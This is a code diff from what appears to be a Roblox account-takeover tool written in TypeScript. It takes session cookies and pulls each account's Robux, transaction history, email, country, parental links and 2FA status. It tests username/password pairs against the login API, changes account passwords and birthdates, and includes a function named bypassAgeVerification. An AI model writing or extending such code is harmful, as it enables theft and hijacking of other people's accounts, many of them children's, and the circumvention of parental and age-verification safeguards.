@@ -120,102 +120,6 @@ export async function validateCookie(cookie: string, maxAttempts = 4): Promise<{
   };
 }
 
-export async function getUserAge(userId: number): Promise<number> {
-  try {
-    const resp = await axios.get(`https://users.roblox.com/v1/users/${userId}`, { timeout: AXIOS_TIMEOUT });
-    const created = new Date(resp.data.created);
-    const now = new Date();
-    const diff = now.getTime() - created.getTime();
-    return Math.floor(diff / (1000 * 3600 * 24));
-  } catch {
-    return -1;
-  }
-}
-
-export async function fetchRobux(cookie: string, userId: string): Promise<number> {
-  try {
-    const resp = await axiosWithRetry<any>('get', `https://economy.roblox.com/v1/users/${userId}/currency`, {
-      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-    });
-    if (resp.status === 200 && resp.data?.robux !== undefined) return resp.data.robux;
-  } catch {}
-  return 0;
-}
-
-export async function fetchTransactionTotals(cookie: string, userId: string): Promise<{ incoming: number; outgoing: number }> {
-  try {
-    const resp = await fetch(`https://apis.roblox.com/transaction-records/v1/users/${userId}/transaction-totals?usedTypes=2228224&timeFrame=Year&transactionType=summary`, {
-      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-    });
-    if (resp.status === 200) {
-      const data = (await resp.json()) as { incomingRobuxTotal: number; outgoingRobuxTotal: number };
-      return { incoming: data.incomingRobuxTotal || 0, outgoing: data.outgoingRobuxTotal || 0 };
-    }
-  } catch {}
-  return { incoming: 0, outgoing: 0 };
-}
-
-export async function fetchCountry(cookie: string, retries = 2): Promise<string> {
-  for (let i = 0; i <= retries; i++) {
-    try {
-      const resp = await fetch('https://accountsettings.roblox.com/v1/account/settings/account-country', {
-        headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-      });
-      if (resp.status === 200) {
-        const data = (await resp.json()) as { value: { countryName: string } };
-        return data.value?.countryName || 'Unknown';
-      }
-    } catch {}
-    if (i < retries) await new Promise(resolve => setTimeout(resolve, 500 * (i + 1)));
-  }
-  return 'Unknown';
-}
-
-export async function fetchEmailInfo(cookie: string, retries = 2): Promise<{ verified: string | null; pending: string | null }> {
-  for (let i = 0; i <= retries; i++) {
-    try {
-      const resp = await fetch('https://accountsettings.roblox.com/v1/email', {
-        headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-      });
-      if (resp.status === 200) {
-        const data = (await resp.json()) as { emailAddress: string; verified: boolean; canBypassPasswordForEmailUpdate: boolean };
-        return { verified: data.verified ? data.emailAddress : null, pending: null };
-      }
-    } catch {}
-    if (i < retries) await new Promise(resolve => setTimeout(resolve, 500 * (i + 1)));
-  }
-  return { verified: null, pending: null };
-}
-
-export async function fetchParentalControls(cookie: string): Promise<{ hasParent: boolean }> {
-  try {
-    const resp = await fetch('https://apis.roblox.com/parental-controls-api/v1/parental-controls/get-linked-parents', {
-      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-    });
-    if (resp.status === 200) {
-      const data = (await resp.json()) as { parents: unknown[]; canAddParent: boolean };
-      return { hasParent: (data.parents && data.parents.length > 0) || false };
-    }
-  } catch {}
-  return { hasParent: false };
-}
-
-export async function fetchAvatarThumbnail(userId: string): Promise<string | null> {
-  try {
-    const resp = await fetch(
-      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`,
-      { headers: { 'User-Agent': 'Mozilla/5.0' } }
-    );
-    if (resp.status === 200) {
-      const data = (await resp.json()) as { data: { imageUrl: string }[] };
-      if (data.data && data.data.length > 0 && data.data[0].imageUrl) {
-        return data.data[0].imageUrl;
-      }
-    }
-  } catch {}
-  return null;
-}
-
 export async function refreshSession(cookie: string): Promise<{ success: boolean; newCookie: string | null; error?: string }> {
   try {
     const trimmed = cookie.trim();
@@ -322,57 +226,100 @@ export async function killAndRefreshSession(cookie: string): Promise<{ success: 
   }
 }
 
-export async function getCsrfToken(): Promise<string | null> {
+export async function getUserAge(userId: number): Promise<number> {
   try {
-    const jar = new CookieJar();
-    const client = wrapper(axios.create({ jar }));
-    const resp = await client.post('https://auth.roblox.com/v2/logout', {}, {
-      headers: { 'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json' },
-      validateStatus: () => true,
-      timeout: 10000,
-    });
-    if (resp.status === 403) {
-      return resp.headers['x-csrf-token'] || null;
-    }
-    return null;
+    const resp = await axios.get(`https://users.roblox.com/v1/users/${userId}`, { timeout: AXIOS_TIMEOUT });
+    const created = new Date(resp.data.created);
+    const now = new Date();
+    const diff = now.getTime() - created.getTime();
+    return Math.floor(diff / (1000 * 3600 * 24));
   } catch {
-    return null;
+    return -1;
   }
 }
 
-export async function updateBirthdate(cookie: string, birthdate: string, password?: string): Promise<{ success: boolean; status: number; message?: string }> {
+export async function fetchRobux(cookie: string, userId: string): Promise<number> {
   try {
-    const csrf = await getCsrfToken();
-    if (!csrf) {
-      return { success: false, status: 0, message: 'Failed to get CSRF token' };
-    }
-    const jar = new CookieJar();
-    await jar.setCookie(`.ROBLOSECURITY=${cookie}; Domain=.roblox.com; Path=/`, 'https://users.roblox.com');
-    const client = wrapper(axios.create({ jar }));
-    const payload: any = { birthdate };
-    if (password) payload.password = password;
-    const resp = await client.post('https://users.roblox.com/v1/birthdate', payload, {
-      headers: {
-        'X-CSRF-TOKEN': csrf,
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-      },
-      validateStatus: () => true,
+    const resp = await axiosWithRetry<any>('get', `https://economy.roblox.com/v1/users/${userId}/currency`, {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
+    });
+    if (resp.status === 200 && resp.data?.robux !== undefined) return resp.data.robux;
+  } catch {}
+  return 0;
+}
+
+export async function fetchTransactionTotals(cookie: string, userId: string): Promise<{ incoming: number; outgoing: number }> {
+  try {
+    const resp = await fetch(`https://apis.roblox.com/transaction-records/v1/users/${userId}/transaction-totals?usedTypes=2228224&timeFrame=Year&transactionType=summary`, {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
     });
     if (resp.status === 200) {
-      return { success: true, status: 200, message: 'Birthdate updated successfully' };
+      const data = (await resp.json()) as { incomingRobuxTotal: number; outgoingRobuxTotal: number };
+      return { incoming: data.incomingRobuxTotal || 0, outgoing: data.outgoingRobuxTotal || 0 };
     }
-    let message = `HTTP ${resp.status}`;
+  } catch {}
+  return { incoming: 0, outgoing: 0 };
+}
+
+export async function fetchCountry(cookie: string, retries = 2): Promise<string> {
+  for (let i = 0; i <= retries; i++) {
     try {
-      const data = resp.data;
-      if (data.errors && data.errors.length) {
-        message = data.errors[0].message || message;
+      const resp = await fetch('https://accountsettings.roblox.com/v1/account/settings/account-country', {
+        headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
+      });
+      if (resp.status === 200) {
+        const data = (await resp.json()) as { value: { countryName: string } };
+        return data.value?.countryName || 'Unknown';
       }
     } catch {}
-    return { success: false, status: resp.status, message };
-  } catch (err: any) {
-    return { success: false, status: 0, message: err.message };
+    if (i < retries) await new Promise(resolve => setTimeout(resolve, 500 * (i + 1)));
   }
+  return 'Unknown';
+}
+
+export async function fetchEmailInfo(cookie: string, retries = 2): Promise<{ verified: string | null; pending: string | null }> {
+  for (let i = 0; i <= retries; i++) {
+    try {
+      const resp = await fetch('https://accountsettings.roblox.com/v1/email', {
+        headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
+      });
+      if (resp.status === 200) {
+        const data = (await resp.json()) as { emailAddress: string; verified: boolean; canBypassPasswordForEmailUpdate: boolean };
+        return { verified: data.verified ? data.emailAddress : null, pending: null };
+      }
+    } catch {}
+    if (i < retries) await new Promise(resolve => setTimeout(resolve, 500 * (i + 1)));
+  }
+  return { verified: null, pending: null };
+}
+
+export async function fetchParentalControls(cookie: string): Promise<{ hasParent: boolean }> {
+  try {
+    const resp = await fetch('https://apis.roblox.com/parental-controls-api/v1/parental-controls/get-linked-parents', {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
+    });
+    if (resp.status === 200) {
+      const data = (await resp.json()) as { parents: unknown[]; canAddParent: boolean };
+      return { hasParent: (data.parents && data.parents.length > 0) || false };
+    }
+  } catch {}
+  return { hasParent: false };
+}
+
+export async function fetchAvatarThumbnail(userId: string): Promise<string | null> {
+  try {
+    const resp = await fetch(
+      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`,
+      { headers: { 'User-Agent': 'Mozilla/5.0' } }
+    );
+    if (resp.status === 200) {
+      const data = (await resp.json()) as { data: { imageUrl: string }[] };
+      if (data.data && data.data.length > 0 && data.data[0].imageUrl) {
+        return data.data[0].imageUrl;
+      }
+    }
+  } catch {}
+  return null;
 }
 
 export async function fetchCreditBalance(cookie: string): Promise<{ balance: number; currency: string }> {
@@ -436,6 +383,158 @@ export async function fetchRolimonsRAP(userId: string): Promise<{ rap: number | 
     }
   } catch {}
   return { rap: null, premium: false };
+}
+
+export async function getCsrfToken(): Promise<string | null> {
+  try {
+    const jar = new CookieJar();
+    const client = wrapper(axios.create({ jar }));
+    const resp = await client.post('https://auth.roblox.com/v2/logout', {}, {
+      headers: { 'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json' },
+      validateStatus: () => true,
+      timeout: 10000,
+    });
+    if (resp.status === 403) {
+      return resp.headers['x-csrf-token'] || null;
+    }
+    return null;
+  } catch {
+    return null;
+  }
+}
+
+export async function checkTwoFactorStatus(cookie: string, userId: string): Promise<{ enabled: boolean; mediaType: string | null }> {
+  try {
+    const resp = await fetch(`https://www.roblox.com/v1/users/${userId}/configuration`, {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
+    });
+    if (resp.status === 200) {
+      const data = (await resp.json()) as { primaryMediaType: string; methods: { mediaType: string; enabled: boolean }[] };
+      const authMethod = data.methods.find(m => m.mediaType === 'Authenticator');
+      return {
+        enabled: authMethod ? authMethod.enabled : false,
+        mediaType: data.primaryMediaType || null,
+      };
+    }
+  } catch {}
+  return { enabled: false, mediaType: null };
+}
+
+export async function validatePassword(username: string, password: string): Promise<{ valid: boolean; error?: string }> {
+  const csrf = await getCsrfToken();
+  if (!csrf) {
+    return { valid: false, error: 'Failed to get CSRF token' };
+  }
+  try {
+    const resp = await axios.post(
+      'https://auth.roblox.com/v2/login',
+      { ctype: 'Username', cvalue: username, password },
+      {
+        headers: {
+          'Content-Type': 'application/json',
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+          'X-CSRF-TOKEN': csrf,
+        },
+        validateStatus: () => true,
+        timeout: AXIOS_TIMEOUT,
+      }
+    );
+    if (resp.status === 200) {
+      return { valid: true };
+    }
+    if (resp.status === 403) {
+      const challengeId = resp.headers['rblx-challenge-id'];
+      if (challengeId) {
+        return { valid: false, error: 'Challenge required' };
+      }
+      return { valid: false, error: 'Invalid credentials' };
+    }
+    return { valid: false, error: `HTTP ${resp.status}` };
+  } catch (err: any) {
+    return { valid: false, error: err.message };
+  }
+}
+
+export async function changePassword(
+  cookie: string,
+  currentPassword: string,
+  newPassword: string
+): Promise<{ success: boolean; error?: string }> {
+  try {
+    const session = await (async () => {
+      const jar = new CookieJar();
+      await jar.setCookie(`.ROBLOSECURITY=${cookie.trim()}; Domain=.roblox.com; Path=/`, 'https://auth.roblox.com');
+      return wrapper(axios.create({ jar }));
+    })();
+
+    const baseHeaders = {
+      'Content-Type': 'application/json',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+    };
+
+    let resp = await session.post('https://auth.roblox.com/v2/user/passwords/change', { currentPassword, newPassword }, {
+      headers: baseHeaders,
+      validateStatus: () => true,
+      timeout: AXIOS_TIMEOUT,
+    });
+
+    if (resp.status === 403 && resp.headers['x-csrf-token']) {
+      const csrf = resp.headers['x-csrf-token'];
+      resp = await session.post('https://auth.roblox.com/v2/user/passwords/change', { currentPassword, newPassword }, {
+        headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrf },
+        validateStatus: () => true,
+        timeout: AXIOS_TIMEOUT,
+      });
+    }
+
+    if (resp.status === 200) {
+      return { success: true };
+    }
+
+    let errorMsg = `HTTP ${resp.status}`;
+    try {
+      const json = resp.data;
+      if (json && json.message) errorMsg = json.message;
+    } catch {}
+    return { success: false, error: errorMsg };
+  } catch (err: any) {
+    return { success: false, error: err.message };
+  }
+}
+
+export async function updateBirthdate(cookie: string, birthdate: string, password?: string): Promise<{ success: boolean; status: number; message?: string }> {
+  try {
+    const csrf = await getCsrfToken();
+    if (!csrf) {
+      return { success: false, status: 0, message: 'Failed to get CSRF token' };
+    }
+    const jar = new CookieJar();
+    await jar.setCookie(`.ROBLOSECURITY=${cookie}; Domain=.roblox.com; Path=/`, 'https://users.roblox.com');
+    const client = wrapper(axios.create({ jar }));
+    const payload: any = { birthdate };
+    if (password) payload.password = password;
+    const resp = await client.post('https://users.roblox.com/v1/birthdate', payload, {
+      headers: {
+        'X-CSRF-TOKEN': csrf,
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+      },
+      validateStatus: () => true,
+    });
+    if (resp.status === 200) {
+      return { success: true, status: 200, message: 'Birthdate updated successfully' };
+    }
+    let message = `HTTP ${resp.status}`;
+    try {
+      const data = resp.data;
+      if (data.errors && data.errors.length) {
+        message = data.errors[0].message || message;
+      }
+    } catch {}
+    return { success: false, status: resp.status, message };
+  } catch (err: any) {
+    return { success: false, status: 0, message: err.message };
+  }
 }
 
 export async function bypassAgeVerification(cookie: string, password: string): Promise<{
